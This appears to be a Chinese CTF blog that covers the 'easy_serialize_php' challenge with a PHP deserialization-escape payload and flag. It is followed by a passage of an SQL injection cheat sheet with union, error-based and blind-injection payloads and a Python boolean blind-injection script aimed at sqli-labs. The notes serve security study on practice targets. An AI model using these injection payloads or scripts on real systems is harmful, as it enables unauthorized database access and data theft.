<h2 id="wakeup的绕过"><a href="#wakeup的绕过" class="headerlink" title="__wakeup的绕过"></a>__wakeup的绕过</h2><p>属性个数与实际不符</p>
<h2 id="php对private属性的序列化"><a href="#php对private属性的序列化" class="headerlink" title="php对private属性的序列化"></a>php对private属性的序列化</h2><p>又php在对private属性的变量序列化时，会在类名前后生成空字符0x00，复制到剪切板时会被截断，因此需要加上%00，才能正常解析</p>
<h2 id="php生成序列化对象的代码模板"><a href="#php生成序列化对象的代码模板" class="headerlink" title="php生成序列化对象的代码模板"></a>php生成序列化对象的代码模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Name&#123;</span><br><span class="line">		private $username&#x3D;&quot;admin&quot;;</span><br><span class="line">		private $password&#x3D;&quot;100&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$a &#x3D; new Name();</span><br><span class="line">	echo(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>考察：php代码审计，php序列化</p>
<p>打开页面，打开view-source，可以看到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若已经拥有SESSION，则把SESSION删除</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="comment"># 将全局变量$_POST解开，相当于得到$user=&#x27;guest&#x27;,$function=$function</span></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>根据代码，访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:58008&#x2F;index.php?f&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>可以php的配置信息，并得到flag的可能地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3_f1ag.php</span><br></pre></td></tr></table></figure>
<p>那么按照常理，现在就应该是在URL上提交（GET方式）或POST数据提交，查看相关文件的操作了</p>
<p><strong>注意，此处有一个关键要点是通过post方式提交_SESSION，修改_SESSION中的参数，来实现查看文件</strong></p>
<p>根据代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>所以要把d0g3_f1ag.php在base64_encode后，填充入userinfo的img下标中</p>
<p>而userinfo又是由这一句得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br></pre></td></tr></table></figure>
<p>serialize_info由$SESSION得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure>
<p>而SESSION会经过filter，且其中的img标签会被修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据wp，使用php序列化的逃逸，构成下列payload（下面有解析）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;cb08b7952dfbcf0ed90a8d07db20e139&#125; </span><br></pre></td></tr></table></figure>


<h2 id="php反序列化逃逸原理"><a href="#php反序列化逃逸原理" class="headerlink" title="php反序列化逃逸原理"></a>php反序列化逃逸原理</h2><p>首先序列化格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; </span><br><span class="line">    [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;Hed9eh0g&quot;</span> </span><br><span class="line">    [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line">序列化后会得到</span><br><span class="line"><span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>其次，序列化有一种特点，若在序列化过程中，有一些字符被过滤替换为空，会尝试向后读取相同位数字符。如下flag被过滤的情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;</span><br><span class="line">    s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;</span><br><span class="line">    s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a:3:&#123;</span></span><br><span class="line"><span class="string">    s:4:&quot;</span>user<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:24:&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>因此，可以构造序列化字符串，绕过相关过滤</p>
<p>本题中逃逸的解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">未过滤前</span><br><span class="line">_SESSION[flagflag]=<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">序列化后</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>flagflag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:58:&quot;</span></span><br><span class="line">		<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">过滤后</span><br><span class="line">a:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	s:<span class="number">58</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">		&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">		s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">	<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化填充后，再序列化时</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;<span class="string">&quot;; // 字符串里的东西随便填</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h1><h2 id="php下的MD5函数"><a href="#php下的MD5函数" class="headerlink" title="php下的MD5函数"></a>php下的MD5函数</h2><p>md5(string,raw)</p>
<p>string：必须，规定要计算的字符串</p>
<p>raw：输出格式。TRUE，原始16字符二进制格式；FALSE，默认，32字符十六进制数</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="ckk3rwd020000x4us71x47qlj" data-title="CTF_Web PHP代码审计" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SQL注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
  <time class="dt-published" datetime="2021-01-15T00:51:02.000Z" itemprop="datePublished">2021-01-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>主要是方便我自己查</p>
<h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>例题：sqllabs Less1、2、3、4</p>
<p>知识点：information_schema使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(scheme_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ </span></span><br><span class="line"># 爆表名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br><span class="line"># 爆列名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">无空格版本</span><br><span class="line"><span class="keyword">select</span>(group_concat(scheme_name))<span class="keyword">from</span>(information_schema.schemata))#</span><br><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span><span class="string">&#x27;web_sqli&#x27;</span>)#</span><br><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)#</span><br></pre></td></tr></table></figure>
<h2 id="不适用information-schema"><a href="#不适用information-schema" class="headerlink" title="不适用information_schema"></a>不适用information_schema</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()</span><br><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>


<h1 id="XPath报错注入"><a href="#XPath报错注入" class="headerlink" title="XPath报错注入"></a>XPath报错注入</h1><h2 id="updatexml和extractvalue"><a href="#updatexml和extractvalue" class="headerlink" title="updatexml和extractvalue"></a>updatexml和extractvalue</h2><p>例题：sqllabs less5、6</p>
<p>语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为32个字符</span><br><span class="line"></span><br><span class="line">(1). 通过updatexml报错</span><br><span class="line">and updatexml(1,concat(0x7e,SUBSTR((payload),1,24),0x7e),1) </span><br><span class="line">and updatexml(1,concat(0x7e,SUBSTR((database()),1,24),0x7e),1)</span><br><span class="line">and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line"></span><br><span class="line">需要配合substr使用</span><br><span class="line">同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</span><br><span class="line"></span><br><span class="line">(2). 通过ExtractValue报错</span><br><span class="line">and extractvalue(1,concat(0x26,substr((payload),1,24),0x26)) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">输出字符有长度限制，最长32位。</span><br><span class="line"></span><br><span class="line">然后就构造payload</span><br></pre></td></tr></table></figure>
<h2 id="双查询注入（floor）"><a href="#双查询注入（floor）" class="headerlink" title="双查询注入（floor）"></a>双查询注入（floor）</h2><p>例题：less5</p>
<p>原理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</span><br></pre></td></tr></table></figure>
<p>语句格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意payload要有括号</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (payload),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat( (select database()),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span></span><br><span class="line"><span class="string"># 爆表名，注意表名过多，所以要逐个爆 limit i,1</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)  ) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line"># 爆列名</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>例题：less8</p>
<p>适用场景：不返回报错信息，但是根据sql语句正确性会有不同的回显</p>
<p>脚本模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此脚本为返回数据库名，替换database()处即可</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>


<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>最常规的</p>
<h2 id=""><a href="#" class="headerlink" title="^"></a>^</h2><p>1^1=0，1^0=1，用于过滤了if的报错注入</p>
<h2 id="字符大小比较"><a href="#字符大小比较" class="headerlink" title="字符大小比较"></a>字符大小比较</h2><p>可用于if被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select &#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>


<h2 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h2><p>可用于if被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39; # 从user()中判断是否有以r字母开头的值，有的话返回1</span><br></pre></td></tr></table></figure>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>例题：less9、10</p>
<p>适用情况：能执行sleep()函数</p>
<p>判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">延时大概5秒，说明可以采用时间盲注</span><br></pre></td></tr></table></figure>
<p>语句：</p>
